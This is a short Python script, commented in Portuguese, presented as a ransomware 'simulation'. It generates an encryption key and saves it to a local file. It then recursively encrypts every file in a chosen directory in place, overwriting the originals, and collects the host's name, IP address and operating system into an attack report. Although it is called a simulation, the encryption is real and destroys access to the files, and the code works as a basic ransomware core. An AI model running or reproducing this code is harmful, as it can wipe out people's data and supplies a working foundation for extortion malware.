import os
import socket
import platform
from datetime import datetime
from cryptography.fernet import Fernet

# Função para gerar uma chave secreta
def generate_key():
    return Fernet.generate_key()

# Função para criptografar um arquivo
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    f = Fernet(key)
    encrypted_data = f.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Função para pegar informações do sistema
def get_system_info():
    system_info = {
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture(),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return system_info

# Função principal para simular o ransomware
def simulate_ransomware(directory):
    # Captura as informações do sistema
    system_info = get_system_info()

    if not os.path.exists(directory):
        return f"Diretório não encontrado. Informações do sistema: {system_info}"

    # Gera uma chave secreta para criptografar os arquivos
    key = generate_key()

    # Salva a chave em um arquivo (em um cenário real, o invasor poderia pedir isso)
    with open("ransomware_key.key", "wb") as key_file:
        key_file.write(key)

    # Lista todos os arquivos no diretório e subdiretórios
    files_encrypted = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
                files_encrypted.append(file_path)
            except Exception as e:
                continue

    # Gerando um relatório final com as informações do sistema e arquivos afetados
    if files_encrypted:
        result = f"Arquivos criptografados: {', '.join(files_encrypted)}"
    else:
        result = "Nenhum arquivo foi criptografado."

    # Adicionando as informações do sistema no relatório
    result += f"\nInformações do Sistema:\n"
    result += f"Hostname: {system_info['hostname']}\n"
    result += f"IP: {system_info['ip_address']}\n"
    result += f"SO: {system_info['os']} {system_info['os_version']}\n"
    result += f"Arquitetura: {system_info['architecture']}\n"
    result += f"Data do Ataque: {system_info['timestamp']}"

    return result
